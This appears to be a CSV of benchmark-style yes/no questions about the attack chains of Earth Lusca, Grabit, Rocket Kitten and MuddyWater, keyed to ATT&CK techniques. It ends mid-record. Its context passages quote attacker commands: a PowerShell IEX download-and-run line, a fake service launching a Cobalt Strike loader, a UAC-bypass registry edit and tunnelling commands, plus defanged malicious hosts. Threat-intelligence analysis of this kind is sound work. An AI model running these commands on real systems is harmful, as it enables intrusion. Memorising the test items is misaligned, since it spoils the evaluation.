2214,376,376-Exfiltration-T1537-Transfer Data to Cloud Account,"After collecting data using WinRAR to compress files into archives and capturing email and screen data, is Earth Lusca likely to utilize C2 channels for transferring stolen data to cloud accounts using megacmd?","Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2215,376,376-Exfiltration-T1041-Exfiltration Over C2 Channel,Is it likely that Earth Lusca utilized tools such as WinRAR to package files from local systems and network shared drives into archives before exfiltrating these files over their C2 channels to avoid detection?,"Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2221,376,376-Privilege Escalation-T1574-Hijack Execution Flow,"Before Earth Lusca escalates privileges by hijacking the execution flow, is it likely that they will maintain persistence by creating services or scheduling tasks and later engage in defense evasion through techniques such as abusing elevation control mechanisms or modifying the registry?","Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2222,376,376-Discovery-T1046-Network Service Discovery,"After using spear phishing and malicious JavaScript in watering hole attacks to gain initial access and deploying the Cobalt Strike loader disguised as a system update service during execution, is it likely that Earth Lusca will use tools like HUC Port Banner Scanner, nbtscan, and fscan for network service discovery during the discovery phase?","Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2223,376,376-Lateral Movement-T1210-Exploitation of Remote Services,"After employing scanning tools such as HUC Port Banner Scanner and commands like 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' during the discovery phase, is it likely that Earth Lusca will exploit remote services and engage in lateral movement by establishing network tunnels between the target's network and external servers?","Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2224,376,376-Lateral Movement-T1534-Internal Spearphishing,"Is it likely that Earth Lusca used tools like HUC Port Banner Scanner, nbtscan, and fscan to discover machines in the compromised network before engaging in lateral movement by exploiting remote services and using internal spear phishing?","Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2225,376,376-Lateral Movement-T1570-Lateral Tool Transfer,"After using tools like HUC Port Banner Scanner and nbtscan for network machine discovery during the discovery phase, is Earth Lusca likely to transfer tools using lateral tool transfer methods such as lcx and frp before collecting data from local systems and shared drives using tools like WinRAR and megacmd?","Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.","Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",Yes,technical-brief-delving-deep-an-analysis-of-earth-lusca-operations
2230,377,377-Credential Access-T1056-Input Capture,"After Grabit malware establishes persistence by modifying common registry entries such as startup configurations, is it likely to include a Keylogger functionality that prepares files acting as containers for keyboard interrupts to collect hostnames, application names, usernames, and passwords?","Credential Access: Grabit includes a Keylogger functionality that prepares files acting as containers for keyboard interrupts, collecting hostnames, application names, usernames, and passwords. The file names contain strings such as 'HawkEye_Keylogger_Execution_Confirmed_<VICTIM>'.","Initial Access: Grabit malware is delivered via a Microsoft Office Word (.doc) email attachment containing a malicious macro named AutoOpen. This macro opens a TCP socket and sends an HTTP request to a compromised remote server used as a malware hub to download the malware. Some macros were password protected, but the .doc file's archive nature allowed clear-text visibility of macro strings when opened in an editor.
Persistence: Grabit malware modifies common registry entries, such as startup configurations, without covering its tracks. The binaries are not deleted in most cases, and its communication is in clear-text.
Command and Control: Grabit's 'call home' functionality communicates over obvious channels without attempting to hide its activity.
Others: Kaspersky researchers investigated the Grabit malware after clients in the United States reported infections. The campaign began in late February 2015 and ended in mid-March, spreading from India, the United States, and Israel globally. The malware, written in Windows machine 32-bit processor code over the Microsoft .NET Framework, varied in size and activity but shared similar internal names and identifiers. The compilation timeline from March 7th to 9th, 2015, showed a range of sample sizes and obfuscation levels, with some samples indicating testing of features and packers. The malware employed serious encryption and ASLR, suggesting the use of an open source RAT or commercial framework. Dynamic analysis revealed that the malware did not employ sophisticated evasion techniques. Approximately 10,000 stolen files were collected, with companies in Thailand and India most affected. The malware used various RATs, including DarkComet, and communicated encrypted data over HTTP random ports. Some samples shared the same hosting server and credentials, hinting at a group rather than an individual threat actor. Malware derivatives were mainly located in the 'C:\Users\<user>\AppData\Roaming\Microsoft' directory, with phishing extensions (.doc) and various icons (.pdf, .doc, .ttf, .xls, .ppt, .msg, .exe). The stealer targeted files with extensions like .txt and .jpeg, and additional executable names included 'AudioEndpointBuilder.exe', 'BrokerInfrastructure.exe', and 'WindowsUpdate.exe'. Malware extensions were .zip or .exe, and multiple SHA-1 hashes and IP addresses were associated with the malware.",Yes,Grabit
2235,378,378-Defense Evasion-T1622-Debugger Evasion,"Is it likely that Rocket Kitten will employ spear-phishing emails containing malicious payloads for initial access before using both simple and advanced tools during execution, and later use debugger evasion techniques for defense evasion?","Defense Evasion: Rocket Kitten employs various defense evasion techniques, including using fake identities, making phone calls, and sending messages to gain trust. They breach websites to set up phishing pages or register new domains solely for phishing. The group also uses anti-debugging techniques and obfuscates their strings and API calls to avoid detection.","Initial Access: The Rocket Kitten Group employs spear phishing and social engineering as their primary point of entry. They establish contact with victims by faking accounts and identities, using fake Google Drive or Gmail accounts, stolen documents, and social media accounts like Facebook. The spear-phishing email contains a link or a file that, when clicked or opened, unleashes a payload that takes over the target machine.
Execution: Rocket Kitten utilizes several different malware types to execute their attacks. They use both simple tools they likely developed and more advanced, publicly available ones, which may have been either purchased or stolen. Despite their lack of professionalism, as evidenced by content mistakes, they compensate with persistence. The group uses a keylogger detected by Trend Micro as TSPY_WOOLERG, which logs keystrokes and connects applications to victims' Gmail accounts as a 'connected app', allowing attackers to download all of their victims' emails for offline processing. They also install other pieces of malware as needed.
Persistence: Rocket Kitten demonstrates persistence by repeatedly attempting to attack the same targets, using new cover stories and techniques to entice users. They execute numerous password-reset attempts to overwhelm targets, making them believe they are losing control over their accounts. The group prefers to target victims' private email addresses and accounts rather than organizational ones, taking advantage of the lack of peripheral protection at home.
Credential Access: Rocket Kitten uses social engineering and spear phishing to steal credentials. They take over accounts immediately after obtaining passwords through emails, Facebook messages, or phone calls. They employ a keylogger to capture keystrokes and gain access to additional accounts like Facebook, other email accounts, and cloud accounts.
Command and Control: The infected computers communicate with a C&C server, which can download whatever malware is available or intended for the purpose of the attack. The group uses C&C communication to monitor communications and extract information from the victims.",Yes,wp-the-spy-kittens-are-back
2242,380,380-Command and Control-T1105-Ingress Tool Transfer,"After using compromised C2 servers to download files infected with macros for initial access, is MuddyWater likely to use compromised servers to host malicious code as part of their Command and Control operations?","Command and Control: MuddyWater's recent campaign has seen the use of compromised servers to host malicious code for the second stage of attacks. The group has been identified using servers in countries they target, such as a server in Pakistan (hxxp://corplink[.]com[.]pk/wp-content/themes/buisson/16433.jpg) and a server in China (hxxps://bbs[.]kafan[.]cn/thread-2150909-1-1.html). Additionally, a RAT file communicating with the IP address 185.244.149[.]218 was discovered, which sends encoded base64 output to the attacker about processes running on the compromised system.","Initial Access: The Iranian APT group MuddyWater, also known as SeedWorm/Temp.Zagros, has been observed using two attack vectors to target governmental entities and the telecommunication sector. The first vector involves decoy documents exploiting CVE-2017-0199, a Microsoft Office vulnerability that allows remote attackers to execute arbitrary code. The second vector includes communication with compromised C2 servers to download files infected with macros. Notably, MuddyWater has not previously used CVE-2017-0199, which was associated with another Iranian group named OilRig.
